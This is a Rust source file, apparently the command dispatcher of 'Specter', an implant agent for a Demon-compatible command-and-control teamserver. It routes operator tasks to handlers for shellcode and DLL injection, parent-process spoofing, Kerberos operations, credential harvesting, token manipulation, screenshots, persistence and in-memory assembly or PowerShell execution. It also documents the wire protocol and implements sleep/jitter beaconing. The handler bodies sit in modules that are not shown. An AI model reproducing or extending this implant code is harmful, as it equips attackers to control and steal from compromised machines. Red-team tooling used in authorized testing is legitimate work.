//! Command dispatch and handler implementations for the Specter agent.
//!
//! Routes incoming server task packages to platform-native handler functions and
//! assembles the response payloads consumed by the Rust teamserver.
//!
//! # Wire endianness
//!
//! * **Server → agent** (incoming task payload): integers are **little-endian**
//!   (`binary.LittleEndian` in the Go teamserver's `BuildPayloadMessage`).
//! * **Agent → server** (outgoing response payload — outer envelope)**:
//!   `command_id`, `request_id`, and the encrypted `payload_len` prefix are
//!   **big-endian** per the Demon wire protocol (consumed by `parse_callback_packages`).
//! * **Agent → server** (outgoing response payload — inner content)**:
//!   All callback payload *fields* (process entries, sleep values, FS paths, …)
//!   are **little-endian** so they are compatible with the Rust teamserver's
//!   `CallbackParser::read_u32` / `read_utf16` methods.  Only the FS download
//!   OPEN/chunk headers retain big-endian encoding to match the legacy Demon
//!   `PackageAdd*` wire format used by the download subsystem.

mod wire;
pub(crate) use wire::{
    decode_utf16le_null, parse_bytes_le, parse_u32_le, parse_u64_le, write_bytes_le, write_ptr_le,
    write_u32_be_always, write_u32_le, write_utf16le, write_wstring_be,
};
#[cfg(test)]
pub(crate) use wire::{write_ptr_be, write_utf16le_be};

mod assembly;
mod config;
mod filesystem;
mod harvest;
mod inject;
mod kerberos;
mod network;
mod persist;
mod process;
mod screenshot;
mod token;

use std::collections::HashMap;

use red_cell_common::demon::{DemonCallback, DemonCommand, DemonPackage};
use tracing::{info, warn};

use crate::coffeeldr::BofOutputQueue;
use crate::config::SpecterConfig;
use crate::download::DownloadTracker;
use crate::job::JobStore;
use crate::token::TokenVault;

/// In-memory PowerShell script store.  The teamserver sends script bytes via
/// `CommandPsImport`; the agent accumulates them for later execution.
pub type PsScriptStore = Vec<u8>;

// ─── In-memory file staging ─────────────────────────────────────────────────

/// A single in-memory file being staged by the teamserver via `CommandMemFile`
/// chunks.  Once all chunks have arrived (`is_complete()` returns true), the
/// accumulated data can be consumed by other commands such as `CommandFs/Upload`.
#[derive(Debug)]
pub struct MemFile {
    expected_size: usize,
    data: Vec<u8>,
}

impl MemFile {
    /// Append a chunk of data, truncating to `expected_size` if the total would
    /// exceed it.
    fn append(&mut self, chunk: &[u8]) {
        self.data.extend_from_slice(chunk);
        if self.data.len() > self.expected_size {
            self.data.truncate(self.expected_size);
        }
    }

    /// Returns `true` when the accumulated data equals the declared size.
    fn is_complete(&self) -> bool {
        self.data.len() == self.expected_size
    }
}

/// Collection of in-memory files keyed by their teamserver-assigned ID.
pub type MemFileStore = HashMap<u32, MemFile>;

// ─── Result type ─────────────────────────────────────────────────────────────

/// Outcome of dispatching one decoded task package.
#[derive(Debug)]
pub enum DispatchResult {
    /// Send one response packet to the server.
    Respond(Response),
    /// Send multiple response packets (e.g., proc-info + captured output).
    MultiRespond(Vec<Response>),
    /// Cleanly terminate the agent process.
    Exit,
    /// Nothing to send back (no-job, unrecognised command, parse error, …).
    Ignore,
}

/// A single pending agent → server response, ready to be wrapped in a callback
/// envelope and sent over the transport.
#[derive(Debug, Clone)]
pub struct Response {
    /// Demon command ID for the outgoing packet header.
    pub command_id: u32,
    /// Request ID to use for the callback.  When zero the agent loop falls back
    /// to the request ID from the originating task package.
    pub request_id: u32,
    /// Payload bytes already serialised in big-endian wire format.
    pub payload: Vec<u8>,
}

impl Response {
    fn new(cmd: DemonCommand, payload: Vec<u8>) -> Self {
        Self { command_id: cmd.into(), request_id: 0, payload }
    }
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

/// Build a [`BeaconOutput`] / [`DemonCallback::ErrorMessage`] response so the
/// operator receives an immediate error rather than waiting on a task that will
/// never complete.
///
/// Payload wire format (all LE): `[callback_type: u32][len: u32][text bytes]`
fn unimplemented_command_response(cmd: DemonCommand) -> DispatchResult {
    let text = format!("specter does not implement command {cmd:?} yet");
    let mut payload = Vec::new();
    write_u32_le(&mut payload, u32::from(DemonCallback::ErrorMessage));
    write_bytes_le(&mut payload, text.as_bytes());
    DispatchResult::Respond(Response::new(DemonCommand::BeaconOutput, payload))
}

fn text_output_response(text: &str) -> DispatchResult {
    let mut payload = Vec::new();
    write_bytes_le(&mut payload, text.as_bytes());
    DispatchResult::Respond(Response::new(DemonCommand::CommandOutput, payload))
}

fn error_output_response(text: &str) -> DispatchResult {
    let mut payload = Vec::new();
    write_u32_le(&mut payload, u32::from(DemonCallback::ErrorMessage));
    write_bytes_le(&mut payload, text.as_bytes());
    DispatchResult::Respond(Response::new(DemonCommand::BeaconOutput, payload))
}

// ─── Top-level dispatch ───────────────────────────────────────────────────────

/// Route a single decoded [`DemonPackage`] to the appropriate handler.
///
/// The [`DispatchResult`] must be transmitted back to the server using the
/// `request_id` from the original package.
pub fn dispatch(
    package: &DemonPackage,
    config: &mut SpecterConfig,
    token_vault: &mut TokenVault,
    downloads: &mut DownloadTracker,
    mem_files: &mut MemFileStore,
    job_store: &mut JobStore,
    ps_scripts: &mut PsScriptStore,
    bof_output_queue: &BofOutputQueue,
) -> DispatchResult {
    let cmd = match DemonCommand::try_from(package.command_id) {
        Ok(c) => c,
        Err(_) => {
            warn!(command_id = package.command_id, "received unknown command ID — ignoring");
            return DispatchResult::Ignore;
        }
    };

    info!(command = ?cmd, request_id = package.request_id, "dispatching command");

    match cmd {
        DemonCommand::CommandNoJob | DemonCommand::CommandGetJob => DispatchResult::Ignore,
        DemonCommand::CommandSleep => handle_sleep(&package.payload, config),
        DemonCommand::CommandFs => {
            filesystem::handle_fs(&package.payload, package.request_id, downloads, mem_files)
        }
        DemonCommand::CommandTransfer => filesystem::handle_transfer(&package.payload, downloads),
        DemonCommand::CommandProc => process::handle_proc(&package.payload),
        DemonCommand::CommandProcList => process::handle_proc_list(&package.payload),
        DemonCommand::CommandNet => network::handle_net(&package.payload),
        DemonCommand::CommandToken => token::handle_token(&package.payload, token_vault),
        DemonCommand::CommandMemFile => {
            filesystem::handle_memfile(&package.payload, package.request_id, mem_files)
        }
        DemonCommand::CommandInjectShellcode => inject::handle_inject_shellcode(&package.payload),
        DemonCommand::CommandInjectDll => inject::handle_inject_dll(&package.payload),
        DemonCommand::CommandSpawnDll => inject::handle_spawn_dll(&package.payload),
        DemonCommand::CommandProcPpidSpoof => {
            inject::handle_proc_ppid_spoof(&package.payload, config)
        }
        DemonCommand::CommandKerberos => kerberos::handle_kerberos(&package.payload),
        DemonCommand::CommandConfig => config::handle_config(&package.payload, config),
        DemonCommand::CommandInlineExecute => assembly::handle_inline_execute(
            &package.payload,
            package.request_id,
            config,
            mem_files,
            job_store,
            bof_output_queue,
        ),
        DemonCommand::CommandJob => assembly::handle_job(&package.payload, job_store),
        DemonCommand::CommandPsImport => {
            assembly::handle_ps_import(&package.payload, ps_scripts, mem_files)
        }
        DemonCommand::CommandAssemblyInlineExecute => {
            assembly::handle_assembly_inline_execute(&package.payload, mem_files)
        }
        DemonCommand::CommandAssemblyListVersions => assembly::handle_assembly_list_versions(),
        DemonCommand::CommandHarvest => harvest::handle_harvest(),
        DemonCommand::CommandScreenshot => screenshot::handle_screenshot(),
        DemonCommand::CommandPackageDropped => filesystem::handle_package_dropped(
            &package.payload,
            package.request_id,
            downloads,
            mem_files,
        ),
        DemonCommand::CommandPersist => persist::handle_persist(&package.payload),
        DemonCommand::CommandExit => DispatchResult::Exit,
        // CommandPivot is intercepted by the agent run-loop (agent.rs) *before*
        // dispatch() is called, so it is routed to PivotState::handle_command()
        // directly.  If it somehow reaches dispatch(), treat it as a no-op.
        DemonCommand::CommandPivot => DispatchResult::Ignore,
        // These are agent-to-server callbacks; ignore if received from server.
        DemonCommand::CommandOutput | DemonCommand::BeaconOutput => DispatchResult::Ignore,
        _ => {
            info!(command = ?cmd, "unhandled command — returning error to operator");
            unimplemented_command_response(cmd)
        }
    }
}

// ─── COMMAND_SLEEP (11) ──────────────────────────────────────────────────────

/// Handle a `CommandSleep` task: update the sleep configuration and echo it back.
///
/// Incoming payload (LE): `[delay_ms: u32][jitter_pct: u32]`
/// Outgoing payload (LE): `[delay_ms: u32][jitter_pct: u32]`
fn handle_sleep(payload: &[u8], config: &mut SpecterConfig) -> DispatchResult {
    let mut offset = 0;

    let delay = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandSleep: failed to parse delay: {e}");
            return DispatchResult::Ignore;
        }
    };
    let jitter = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandSleep: failed to parse jitter: {e}");
            return DispatchResult::Ignore;
        }
    };

    info!(delay_ms = delay, jitter_pct = jitter, "sleep interval updated");
    config.sleep_delay_ms = delay;
    config.sleep_jitter = jitter.min(100);

    let mut out = Vec::with_capacity(8);
    write_u32_le(&mut out, delay);
    write_u32_le(&mut out, jitter);
    DispatchResult::Respond(Response::new(DemonCommand::CommandSleep, out))
}

#[cfg(test)]
mod tests;
